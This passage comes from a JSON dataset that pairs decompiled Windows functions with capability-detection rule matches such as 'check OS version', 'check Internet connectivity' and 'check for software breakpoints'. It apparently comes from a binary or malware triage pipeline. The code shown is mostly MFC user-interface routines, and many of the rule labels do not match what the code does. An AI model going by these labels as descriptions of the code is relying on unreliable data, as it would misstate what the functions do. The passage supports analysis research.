        "decompiled_code": "\nvoid __thiscall fcn.004321db(int32_t param_1, uint32_t param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.0041f877();\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    param_2 = param_2 & 0xfff0;\n    if (*(iVar2 + 100) == 0) {\ncode_r0x00432217:\n        fcn.0041ee14();\n    }\n    else {\n        if (param_2 < 0xf041) {\n            if (((param_2 != 0xf040) && (param_2 != 0xf000)) && (param_2 != 0xf010)) {\n                iVar2 = param_2 - 0xf020;\ncode_r0x00432210:\n                if ((iVar2 != 0) && (iVar2 != 0x10)) goto code_r0x00432217;\n            }\n        }\n        else if ((param_2 != 0xf050) && (param_2 != 0xf060)) {\n            iVar2 = param_2 - 0xf120;\n            goto code_r0x00432210;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x1c), 0x365, 0, (param_2 - 0xf000 >> 4) + 0x1ef00);\n        if (iVar2 == 0) {\n            (*pcVar1)(*(param_1 + 0x1c), 0x111, 0xe147, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 372
    },
    "0043235a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043235a(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int16_t iVar5;\n    int32_t in_ECX;\n    uint var_10ch;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    uVar4 = fcn.00434fe8();\n    pcVar2 = _sym.imp.KERNEL32.dll_GlobalGetAtomNameA;\n    iVar1 = *(uVar4 + 4);\n    if ((((iVar1 != 0) && (arg_ch != 0)) && (iVar5 = arg_ch >> 0x10,  iVar5 != 0)) &&\n       ((arg_ch == *(iVar1 + 0x8c) && (iVar5 == *(iVar1 + 0x8e))))) {\n        (*_sym.imp.KERNEL32.dll_GlobalGetAtomNameA)(uVar4 & 0xffff0000 | *(iVar1 + 0x8c), &var_108h, 0x103);\n        pcVar3 = _sym.imp.KERNEL32.dll_GlobalAddAtomA;\n        (*_sym.imp.KERNEL32.dll_GlobalAddAtomA)(&var_108h);\n        (*pcVar2)(*(iVar1 + 0x8e), &var_108h, 0x103);\n        (*pcVar3)(&var_108h);\n        (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0x3e4, *(in_ECX + 0x1c), *(iVar1 + 0x8c));\n    }\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 399
    },
    "004324fb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004324fb(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    \n    piVar1 = fcn.004319c3();\n    if (arg_10h == 0) {\n        fcn.0041ce37(0, 0, 0, 0, 0, (-(arg_ch != 0) & 0xffffffc0) + 0x80 | 0x17);\n        (**(*arg_8h + 0x14c))(arg_ch);\n        if ((arg_ch != 0) || (iVar2 = fcn.004319d7(),  iVar2 == 0)) {\n            (**(*piVar1 + 0x144))(0);\n        }\n    }\n    else {\n        (**(*arg_8h + 0x14c))(arg_ch);\n        piVar1[0x33] = piVar1[0x33] | 0xc;\n    }\n    iVar2 = fcn.004319d7();\n    if (iVar2 == 0) {\n        return;\n    }\n    if (arg_8h[0x22] == NULL) {\n        uVar3 = arg_ch != 0;\n    }\n    else {\n        uVar3 = (**(*arg_8h[0x22] + 0x168))();\n    }\n    if (uVar3 == 1) {\n        if (arg_ch != 0) {\n            piVar1[0x27] = -1;\n            if (arg_10h == 0) {\n                uVar4 = 8;\n                goto code_r0x004325be;\n            }\n            piVar1[0x27] = 8;\n            goto code_r0x004325e7;\n        }\n    }\n    else if (uVar3 == 0) {\n        piVar1[0x27] = -1;\n        if (arg_10h != 0) {\n            piVar1[0x27] = 0;\n            return;\n        }\n        uVar4 = 0;\ncode_r0x004325be:\n        fcn.0041cdb9(uVar4);\n        return;\n    }\n    if (arg_10h != 0) {\n        return;\n    }\ncode_r0x004325e7:\n    (**(*piVar1 + 0x144))(0);\n    return;\n}\n",
        "token_count": 559
    },
    "004325f7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004325f7(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t in_ECX;\n    int32_t iVar7;\n    uint arg_ch_00;\n    int32_t iVar8;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00426db6(*(in_ECX + 0x1c));\n    if ((arg_10h == 0) &&\n       ((*(in_ECX + 0x7c) == 0 || (iVar2 = (**(**(in_ECX + 0x7c) + 0x74))(arg_8h, arg_ch, 0),  iVar2 == 0)))) {\n        fcn.0041bffb();\n        iVar2 = fcn.00434fd8();\n        pcVar1 = _sym.imp.USER32.dll_GetMenu;\n        if ((*(iVar2 + 0x78) != *(arg_8h + 4)) &&\n           (((iVar2 = (*_sym.imp.USER32.dll_GetMenu)(*(in_ECX + 0x1c)),  iVar2 != 0 &&\n             (iVar2 = fcn.0041fe34(),  iVar2 != 0)) && (iVar2 = (*pcVar1)(*(iVar2 + 0x1c)),  iVar2 != 0)))) {\n            iVar3 = (*_sym.imp.USER32.dll_GetMenuItemCount)(iVar2);\n            iVar7 = 0;\n            if (0 < iVar3) {\n                do {\n                    iVar8 = iVar7;\n                    iVar4 = (*_sym.imp.USER32.dll_GetSubMenu)(iVar2, iVar7);\n                    if (iVar4 == *(arg_8h + 4)) {\n                        fcn.004235b4(iVar8, iVar2);\n                        break;\n                    }\n                    iVar7 = iVar7 + 1;\n                } while (iVar7 < iVar3);\n            }\n        }\n        var_ch = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(arg_8h + 4));\n        pcVar1 = _sym.imp.USER32.dll_GetMenuItemID;\n        var_24h = 0;\n        if (var_ch != 0) {\n            do {\n                uVar6 = var_24h;\n                var_28h = (*pcVar1)(*(arg_8h + 4), var_24h);\n                uVar5 = var_ch;\n                if (var_28h != 0) {\n                    if (var_28h == 0xffffffff) {\n                        iVar2 = fcn.004094c9(uVar6, var_24h);\n                        if (((iVar2 == 0) || (var_28h = (*pcVar1)(*(iVar2 + 4), 0),  var_28h == 0)) ||\n                           (var_28h == 0xffffffff)) goto code_r0x0043275b;\n                        arg_ch_00 = 0;\n                    }\n                    else if ((*(in_ECX + 0x50) == 0) || (0xefff < var_28h)) {\n                        arg_ch_00 = 0;\n                    }\n                    else {\n                        arg_ch_00 = 1;\n                    }\n                    fcn.0041c021(in_ECX, arg_ch_00);\n                    uVar5 = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(arg_8h + 4));\n                    if (uVar5 < var_ch) {\n                        var_24h = var_24h + (uVar5 - var_ch);\n                        while ((var_24h < uVar5 && (uVar6 = (*pcVar1)(*(arg_8h + 4), var_24h),  uVar6 == var_28h))) {\n                            var_24h = var_24h + 1;\n                        }\n                    }\n                }\ncode_r0x0043275b:\n                var_ch = uVar5;\n                var_24h = var_24h + 1;\n            } while (var_24h < var_ch);\n        }\n    }\n    return;\n}\n",
        "token_count": 987
    },
    "00432771": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00432771(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    \n    iVar1 = fcn.0041f877();\n    if ((in_ECX[0x1f] != NULL) && (iVar2 = (**(*in_ECX[0x1f] + 0x7c))(arg_8h, arg_ch, arg_10h),  iVar2 != 0)) {\n        return;\n    }\n    if (arg_ch == 0xffff) {\n        in_ECX[0xe] = in_ECX[0xe] & 0xffffffbf;\n        if (*(iVar1 + 100) == 0) {\n            in_ECX[0x29] = 0xe001;\n        }\n        else {\n            in_ECX[0x29] = 0xe002;\n        }\n        (*_sym.imp.USER32.dll_SendMessageA)(in_ECX[7], 0x362, in_ECX[0x29], 0);\n        iVar1 = (**(*in_ECX + 0x150))();\n        if (iVar1 != 0) {\n            (*_sym.imp.USER32.dll_UpdateWindow)(*(iVar1 + 0x1c));\n        }\n        goto code_r0x00432848;\n    }\n    if ((arg_8h == 0) || ((arg_ch & 0x810) != 0)) {\n        in_ECX[0x29] = 0;\n    }\n    else {\n        if ((arg_8h < 0xf000) || (0xf1ef < arg_8h)) {\n            if (0xfeff < arg_8h) {\n                in_ECX[0x29] = 0xef1f;\n                goto code_r0x00432844;\n            }\n        }\n        else {\n            arg_8h = (arg_8h - 0xf000 >> 4) + 0xef00;\n        }\n        in_ECX[0x29] = arg_8h;\n    }\ncode_r0x00432844:\n    *(iVar1 + 0x38) = *(iVar1 + 0x38) | 0x40;\ncode_r0x00432848:\n    if (in_ECX[0x29] != in_ECX[0x2a]) {\n        uVar3 = (*_sym.imp.USER32.dll_GetParent)(in_ECX[7]);\n        iVar1 = fcn.0041eeb7(uVar3);\n        if (iVar1 != 0) {\n            (*_sym.imp.USER32.dll_PostMessageA)(in_ECX[7], 0x36a, 0, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 626
    },
    "004328cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_48h\n\nvoid fcn.004328cc(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t **ppiVar3;\n    int32_t *piVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *puVar5;\n    int32_t *unaff_EDI;\n    uint *in_FS_OFFSET;\n    int32_t iStack80;\n    int32_t *var_48h;\n    uint var_44h;\n    uint uStack68;\n    uint var_2ch;\n    uint var_28h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    uStack68 = 10;\n    var_44h = 0x4328e6;\n    fcn.0041af2c();\n    *(unaff_EBP + -4) = 0;\n    var_44h = 10;\n    var_48h = 0x4328f4;\n    fcn.0041af2c();\n    iVar1 = *(extraout_ECX + 0x84);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x10) = iVar1;\n    var_48h = unaff_EDI;\n    while (iVar1 != 0) {\n        iStack80 = unaff_EBP + -0x10;\n        ppiVar3 = fcn.0040854e();\n        piVar4 = *ppiVar3;\n        (**(*piVar4 + 0x158))();\n        iStack80 = 0x432933;\n        var_48h = piVar4;\n        fcn.0041afb0();\n        iVar1 = *(unaff_EBP + -0x10);\n    }\n    puVar5 = *(unaff_EBP + -0x44);\n    while (puVar5 != NULL) {\n        if (puVar5 == NULL) goto code_r0x004198e6;\n        ppiVar3 = puVar5 + 2;\n        puVar5 = *puVar5;\n        if ((*ppiVar3)[0x24] == 0) {\n            var_48h = 0x432966;\n            (**(**ppiVar3 + 0x60))();\n        }\n        else {\n            var_48h = 0x432958;\n            piVar4 = fcn.0041f838();\n            var_48h = 0x43295f;\n            (**(*piVar4 + 0x60))();\n        }\n    }\n    puVar5 = *(unaff_EBP + -0x28);\n    while( true ) {\n        if (puVar5 == NULL) {\n            *(unaff_EBP + -4) = 0;\n            var_48h = 0x432993;\n            fcn.0041af4f();\n            *(unaff_EBP + -4) = 0xffffffff;\n            var_48h = 0x43299f;\n            fcn.0041af4f();\n            *in_FS_OFFSET = *(unaff_EBP + -0xc);\n            return;\n        }\n        if (puVar5 == NULL) break;\n        ppiVar3 = puVar5 + 2;\n        puVar5 = *puVar5;\n        if (*ppiVar3 != NULL) {\n            var_48h = 0x432983;\n            (**(**ppiVar3 + 0x60))();\n        }\n    }\ncode_r0x004198e6:\n    iStack80 = 0x44f1a0;\n    fcn.0040ab89(&stack0xffffffb0, 0x448410);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 853
    },
    "004329b1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004329b1(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    if (arg_8h == 0) {\n        iVar1 = 0;\n    }\n    else {\n        var_4h = *(in_ECX + 0x84);\n        do {\n            if (var_4h == 0) {\n                return 0;\n            }\n            piVar2 = fcn.0040854e(&var_4h);\n            iVar1 = *piVar2;\n            uVar3 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(iVar1 + 0x1c));\n        } while ((uVar3 & 0xffff) != arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 206
    },
    "00433fa3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433fa3(int32_t arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uint var_4h;\n    \n    if ((((*(arg_8h + 0x84) == 0) || (iVar1 = *(arg_8h + 0x88),  iVar1 == 0)) || (*(iVar1 + 0x90) == 0)) ||\n       ((iVar2 = fcn.0042d111(),  iVar2 != 1 || ((*(iVar1 + 0x7c) & arg_14h & 0xf000) == 0)))) {\n        uVar5 = arg_14h;\n        if (((*(arg_8h + 0x7c) & 4) != 0) && (uVar5 = arg_14h | 4,  (arg_14h & 0x5000) != 0)) {\n            uVar5 = arg_14h & 0xffff2fff | 0x2004;\n        }\n        arg_14h = uVar5;\n        piVar4 = fcn.00433dd3(arg_14h);\n        fcn.0041ce37(0, arg_ch, arg_10h, 0, 0, 0x15);\n        if (piVar4[0xd] == 0) {\n            piVar4[0xd] = *(arg_8h + 0x1c);\n        }\n        fcn.0041cc4d(0xe81f);\n        fcn.0042d84f(arg_8h, 0);\n        (**(*piVar4 + 0x144))(1);\n        uVar5 = (*_sym.imp.USER32.dll_GetWindowLongA)(*(arg_8h + 0x1c), 0xfffffff0);\n        if ((uVar5 & 0x10000000) == 0) {\n            return;\n        }\n        fcn.0041cdb9(8);\n    }\n    else {\n        uVar3 = (*_sym.imp.USER32.dll_GetParent)(*(iVar1 + 0x1c));\n        piVar4 = fcn.0041eeb7(uVar3);\n        fcn.0041ce37(0, arg_ch, arg_10h, 0, 0, 0x15);\n        (**(*piVar4 + 0x144))(1);\n    }\n    (*_sym.imp.USER32.dll_UpdateWindow)(piVar4[7]);\n    return;\n}\n",
        "token_count": 600
    },
    "004340ad": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.004340ad(uint lprcSrc2, uint noname_1, uint noname_2, uint noname_3, uint32_t arg_18h, int32_t **arg_1ch)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t lprcSrc1;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    ppiVar2 = arg_1ch;\n    arg_18h = arg_18h & 0xf040;\n    if (arg_1ch != NULL) {\n        *arg_1ch = NULL;\n    }\n    arg_1ch = *(in_ECX + 0x84);\n    do {\n        do {\n            if (arg_1ch == NULL) {\n                return 0;\n            }\n            ppiVar3 = fcn.0040854e(&arg_1ch);\n            piVar1 = *ppiVar3;\n            iVar4 = (**(*piVar1 + 0x158))();\n        } while ((((iVar4 == 0) || (iVar4 = (*_sym.imp.USER32.dll_IsWindowVisible)(piVar1[7]),  iVar4 == 0)) ||\n                 ((piVar1[0x1f] & arg_18h & 0xf000) == 0)) ||\n                ((piVar1[0x24] != 0 && ((piVar1[0x1f] & arg_18h & 0x40) == 0))));\n        (*_sym.imp.USER32.dll_GetWindowRect)(piVar1[7], &lprcSrc1);\n        if (var_8h == lprcSrc1) {\n            var_8h = var_8h + 1;\n        }\n        if (var_4h == var_ch) {\n            var_4h = var_4h + 1;\n        }\n        iVar4 = (*_sym.imp.USER32.dll_IntersectRect)(&lprcSrc1, &lprcSrc1, &lprcSrc2);\n    } while (iVar4 == 0);\n    if (ppiVar2 != NULL) {\n        *ppiVar2 = piVar1;\n    }\n    return piVar1[0x1f] & arg_18h;\n}\n",
        "token_count": 543
    },
    "00434243": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00434243(void)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint lpvBits;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    fcn.00437b0b(8);\n    if (*0x450fd4 == 0) {\n        iVar2 = 0;\n        do {\n            uVar1 = iVar2;\n            iVar2 = iVar2 + 1;\n            *(&stack0xffffffe6 + iVar2 * 2) = 0x5555 << (uVar1 & 1);\n        } while (iVar2 < 8);\n        iVar2 = (*_sym.imp.GDI32.dll_CreateBitmap)(8, 8, 1, 1, &lpvBits);\n        if (iVar2 != 0) {\n            *0x450fd4 = (*_sym.imp.GDI32.dll_CreatePatternBrush)(iVar2);\n            (*_sym.imp.GDI32.dll_DeleteObject)(iVar2);\n        }\n    }\n    if (*0x450fd0 == '\\0') {\n        iVar2 = fcn.0040b2b2(0x43420e);\n        *0x450fd0 = '\\x01' - (iVar2 != 0);\n    }\n    fcn.00437b6e(8);\n    fcn.00426561(*0x450fd4);\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 326
    },
    "00434834": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00434834(uint noname_0, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = fcn.0041cced();\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(in_ECX + 0x1c), &var_14h);\n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    iVar3 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x21);\n    iVar4 = (*pcVar1)(0x20);\n    uVar5 = fcn.0041ee14();\n    if ((var_4h & 0x1000) != 0) {\n        if (uVar5 == 3) {\n            uVar5 = 2;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetKeyState)(2);\n        if (iVar2 < 0) {\n            return 0;\n        }\n    }\n    if (((9 < uVar5) && (uVar5 < 0x12)) || (uVar5 == 4)) {\n        if ((var_4h & 0x800) == 0) {\n            (*_sym.imp.USER32.dll_InflateRect)(&var_14h, -iVar4, -iVar3);\n            if ((var_4h & 0x200) != 0) {\n                if (uVar5 != 4) {\n                    if (uVar5 == 0xd) {\n                        return (arg_ch < var_10h) * 2 + 10;\n                    }\n                    if (uVar5 == 0xe) {\n                        return (arg_ch < var_10h) + 0xb;\n                    }\n                    if (uVar5 == 0x10) {\n                        return ((arg_ch <= var_8h) - 1 & 5) + 10;\n                    }\n                    if (uVar5 != 0x11) {\n                        return uVar5;\n                    }\n                }\n                uVar5 = (var_8h < arg_ch) * 4 + 0xb;\n            }\n        }\n        else {\n            uVar5 = 2;\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 556
    },
    "00434b8d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00434b8d(uint arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_10h_00;\n    uint uVar4;\n    int32_t *in_ECX;\n    int32_t *extraout_ECX;\n    int32_t *piVar5;\n    int32_t extraout_EDX;\n    uint32_t uVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *arg_10h;\n    piVar5 = in_ECX;\n    if (iVar3 < 0) {\n        fcn.004010c0(0x80070057);\n        piVar5 = extraout_ECX;\n        iVar3 = extraout_EDX;\n    }\n    if (arg_ch == 0) {\n        fcn.004026b0(piVar5);\n    }\n    else {\n        iVar2 = *piVar5;\n        uVar1 = iVar2 + iVar3;\n        uVar6 = *(iVar2 + -0xc) + iVar2;\n        if (uVar1 < uVar6) {\n            iVar3 = fcn.0040b6ea(uVar1, arg_ch);\n            if (uVar1 + iVar3 < uVar6) {\n                arg_10h_00 = fcn.0040b788(uVar1 + iVar3, arg_ch);\n                iVar2 = *arg_10h;\n                *arg_10h = iVar2 + iVar3 + 1 + arg_10h_00;\n                fcn.00434b28(arg_8h, iVar2 + iVar3, arg_10h_00);\n                return arg_8h;\n            }\n        }\n        *arg_10h = -1;\n        uVar4 = (**(**(*in_ECX + -0x10) + 0x10))();\n        fcn.00401f60(uVar4);\n    }\n    return arg_8h;\n}\n",
        "token_count": 459
    },
    "00434df9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00434df9(code **param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    \n    *param_1 = vtable.AFX_MODULE_THREAD_STATE.0;\n    if (param_1[0xf] != NULL) {\n        (**(*param_1[0xf] + 0x138))();\n    }\n    if (param_1[5] != NULL) {\n        (***param_1[5])(1);\n    }\n    if (param_1[6] != NULL) {\n        (***param_1[6])(1);\n    }\n    if (param_1[7] != NULL) {\n        (***param_1[7])(1);\n    }\n    if (param_1[8] != NULL) {\n        (***param_1[8])(1);\n    }\n    if (param_1[9] != NULL) {\n        (***param_1[9])(1);\n    }\n    pcVar2 = param_1[0xe];\n    if (pcVar2 != NULL) {\n        while (*(pcVar2 + 0xc) != 0) {\n            uVar1 = fcn.0041aea9();\n            fcn.0041bae1(uVar1);\n            pcVar2 = param_1[0xe];\n        }\n    }\n    if (param_1[0xc] != NULL) {\n        (**(*param_1[0xc] + 4))(1);\n    }\n    if (param_1[0xd] != NULL) {\n        (**(*param_1[0xd] + 4))(1);\n    }\n    if (param_1[0xe] != NULL) {\n        (**(*param_1[0xe] + 4))(1);\n    }\n    return;\n}\n",
        "token_count": 391
    },
    "004352c7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004352c7(uint arg_8h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint32_t var_28h;\n    int32_t lpType;\n    uint lpcbData;\n    uint32_t hKey;\n    uint32_t lParam;\n    uint lpData;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    var_4h = *0x44e0fc;\n    lParam = 0;\n    iVar5 = 0;\n    lpcbData = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32.dll\");\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(lpcbData, \"GetUserDefaultUILanguage\");\n    if (pcVar2 == NULL) {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if (iVar6 < 0) {\n            hKey = 0;\n            iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)\n                              (0x80000001, \"Control Panel\\\\Desktop\\\\ResourceLocale\", 0, 0x20019, &hKey);\n            if (iVar6 == 0) {\n                lpcbData = 0x10;\n                iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, 0, 0, &lpType, &lpData, &lpcbData);\n                if (((iVar6 == 0) && (lpType == 1)) &&\n                   (iVar6 = fcn.0040c773(&lpData, 0x43f4a0, &var_28h), \n                   pcVar1 = _sym.imp.KERNEL32.dll_ConvertDefaultLocale,  iVar6 == 1)) {\n                    lParam = var_28h;\n                    var_3ch = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(var_28h & 0xffff);\n                    var_38h = (*pcVar1)(var_28h & 0x3ff);\n                    iVar5 = 2;\n                }\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            }\n        }\n        else {\n            iVar6 = (*pcVar1)(\"ntdll.dll\");\n            if (iVar6 != 0) {\n                lParam = 0;\n                (*_sym.imp.KERNEL32.dll_EnumResourceLanguagesA)(iVar6, 0x10, 1, 0x4352b1, &lParam);\n                pcVar1 = _sym.imp.KERNEL32.dll_ConvertDefaultLocale;\n                if (lParam != 0) {\n                    uVar4 = lParam & 0x3ff;\n                    var_3ch = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(lParam & 0xffff);\n                    var_38h = (*pcVar1)(uVar4);\n                    iVar5 = 2;\n                }\n            }\n        }\n    }\n    else {\n        lParam = (*pcVar2)();\n        pcVar1 = _sym.imp.KERNEL32.dll_ConvertDefaultLocale;\n        hKey = lParam & 0x3ff;\n        var_3ch = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(lParam & 0xffff);\n        var_38h = (*pcVar1)(hKey);\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(lpcbData, \"GetSystemDefaultUILanguage\");\n        lParam = (*pcVar2)();\n        uVar4 = lParam & 0x3ff;\n        var_34h = (*pcVar1)(lParam & 0xffff);\n        var_30h = (*pcVar1)(uVar4);\n        iVar5 = 4;\n    }\n    (&var_3ch)[iVar5] = 0x800;\n    iVar6 = 0;\n    if (iVar5 != -1) {\n        do {\n            iVar3 = fcn.00435232(arg_8h, (&var_3ch)[iVar6]);\n            if (iVar3 != 0) break;\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < iVar5 + 1);\n    }\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 1002
    },
    "004358ee": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004358ee(int32_t param_1)\n\n{\n    if (*(param_1 + 0x84) != NULL) {\n        (**(**(param_1 + 0x84) + 0x14))();\n    }\n    if (*(param_1 + 0x90) != 0) {\n        fcn.0042e39b(\"Settings\", \"PreviewPages\", *(param_1 + 0x90));\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00435b69": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
